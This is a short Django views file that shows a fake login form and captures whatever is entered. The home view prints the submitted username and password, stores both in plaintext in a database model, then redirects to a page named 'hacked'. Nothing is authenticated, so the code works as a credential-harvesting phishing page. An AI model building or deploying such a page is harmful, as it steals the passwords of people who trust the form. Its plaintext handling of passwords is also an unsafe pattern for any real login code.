from django.shortcuts import redirect, render
from .forms import LoginForm
from .models import LoginDetails

# Create your views here.


def home(request):
    form=LoginForm(request.POST or None)
    LoginDetail=LoginDetails()
    if form.is_valid():
        username=form.cleaned_data.get('username')
        password=form.cleaned_data.get('password')
        print(username,password)
        LoginDetail.username=username
        LoginDetail.password=password
        LoginDetail.save()
        return redirect('hacked/')
    return render(request,'login.html',{'form':form})


def hacked(request):
    return render(request,"confirm.html")
